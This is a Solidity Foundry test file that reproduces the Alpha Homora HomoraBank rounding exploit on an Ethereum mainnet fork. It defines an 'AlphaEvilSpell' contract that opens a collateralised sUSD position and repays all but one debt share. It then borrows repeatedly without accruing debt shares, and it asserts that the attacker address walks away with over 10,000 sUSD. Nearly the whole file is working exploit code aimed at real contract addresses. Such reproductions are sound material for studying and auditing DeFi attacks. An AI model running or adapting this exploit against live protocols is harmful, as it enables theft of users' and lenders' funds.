// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IHomoraBank {
    function execute(
        uint256 positionId,
        address spell,
        bytes calldata data
    ) external payable returns (uint256);
    function transmit(
        address token,
        uint256 amount
    ) external;
    function borrow(
        address token,
        uint256 amount
    ) external;
    function repay(
        address token,
        uint256 amount
    ) external;
    function putCollateral(
        address collateralToken,
        uint256 collateralId,
        uint256 amount
    ) external;
    function borrowBalanceStored(
        uint256 positionId,
        address token
    ) external view returns (uint256);
    function borrowBalanceCurrent(
        uint256 positionId,
        address token
    ) external returns (uint256);
    function getPositionDebtShareOf(
        uint256 positionId,
        address token
    ) external view returns (uint256);

    function getBankInfo(
        address token
    ) external view returns (bool listed, address cToken, uint256 reserve, uint256 totalDebt, uint256 totalShare);
}

interface IWERC20Alpha {
    function mint(
        address token,
        uint256 amount
    ) external;
    function setApprovalForAll(
        address operator,
        bool approved
    ) external;
}

contract AlphaEvilSpell {
    IHomoraBank private constant BANK = IHomoraBank(0x5f5Cd91070960D13ee549C9CC47e7a4Cd00457bb);
    IERC20 private constant SUSD = IERC20(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51);
    IERC20 private constant UNI_WETH_LP = IERC20(0xd3d2E2692501A5c9Ca623199D38826e513033a17);
    IWERC20Alpha private constant WERC20 = IWERC20Alpha(0xe28D9dF7718b0b5Ba69E01073fE82254a9eD2F98);

    // HomoraCaster delegatecalls this spell, so address(this) is the caster holding the assets.
    function open(
        address beneficiary,
        uint256 lpAmount
    ) external {
        BANK.transmit(address(UNI_WETH_LP), lpAmount);
        UNI_WETH_LP.approve(address(WERC20), lpAmount);
        WERC20.mint(address(UNI_WETH_LP), lpAmount);
        WERC20.setApprovalForAll(address(BANK), true);
        BANK.putCollateral(address(WERC20), uint256(uint160(address(UNI_WETH_LP))), lpAmount);

        BANK.borrow(address(SUSD), 1000 ether);
        SUSD.transfer(beneficiary, SUSD.balanceOf(address(this)));
    }

    function repayAlmostAll(
        uint256 amount
    ) external {
        BANK.transmit(address(SUSD), amount);
        SUSD.approve(address(BANK), amount);
        BANK.repay(address(SUSD), amount);
    }

    function borrowWithoutShares(
        address beneficiary,
        uint256 iterations
    ) external {
        for (uint256 i; i < iterations; ++i) {
            (,,, uint256 totalDebt,) = BANK.getBankInfo(address(SUSD));
            BANK.borrow(address(SUSD), totalDebt - 1);
        }
        SUSD.transfer(beneficiary, SUSD.balanceOf(address(this)));
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }
}

contract AlphaFinanceExploitTest is Test {
    IHomoraBank private constant BANK = IHomoraBank(0x5f5Cd91070960D13ee549C9CC47e7a4Cd00457bb);
    IERC20 private constant SUSD = IERC20(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51);
    IERC20 private constant UNI_WETH_LP = IERC20(0xd3d2E2692501A5c9Ca623199D38826e513033a17);
    address private constant CY_SUSD = 0x4e3a36A633f63aee0aB57b5054EC78867CB3C0b8;
    address private constant SUSD_CURVE_POOL = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;
    address private constant ATTACKER = address(0xA11CE);

    function testExploit() public {
        vm.createSelectFork("https://eth.drpc.org", 11_846_489);
        AlphaEvilSpell spell = new AlphaEvilSpell();

        // The unreleased sUSD bank was empty. Supply cash so the rounding exploit can
        // demonstrate repeated extraction without reproducing the later Aave flash loans.
        vm.prank(SUSD_CURVE_POOL);
        SUSD.transfer(CY_SUSD, 100_000 ether);
        vm.prank(SUSD_CURVE_POOL);
        SUSD.transfer(ATTACKER, 10 ether);
        deal(address(UNI_WETH_LP), ATTACKER, 100 ether);

        vm.startPrank(ATTACKER, ATTACKER);
        UNI_WETH_LP.approve(address(BANK), type(uint256).max);
        SUSD.approve(address(BANK), type(uint256).max);

        uint256 positionId = BANK.execute(0, address(spell), abi.encodeCall(spell.open, (ATTACKER, 100 ether)));
        vm.roll(block.number + 3);
        vm.warp(block.timestamp + 45);
        uint256 debt = BANK.borrowBalanceCurrent(positionId, address(SUSD));
        BANK.execute(positionId, address(spell), abi.encodeCall(spell.repayAlmostAll, (debt - 1)));

        assertEq(BANK.getPositionDebtShareOf(positionId, address(SUSD)), 1);

        (bool success,) = address(BANK).call(abi.encodeWithSignature("resolveReserve(address)", address(SUSD)));
        require(success, "resolveReserve failed");

        uint256 balanceBefore = SUSD.balanceOf(ATTACKER);
        BANK.execute(positionId, address(spell), abi.encodeCall(spell.borrowWithoutShares, (ATTACKER, 34)));
        vm.stopPrank();

        assertEq(BANK.getPositionDebtShareOf(positionId, address(SUSD)), 1);
        assertGt(SUSD.balanceOf(ATTACKER) - balanceBefore, 10_000 ether);
    }
}
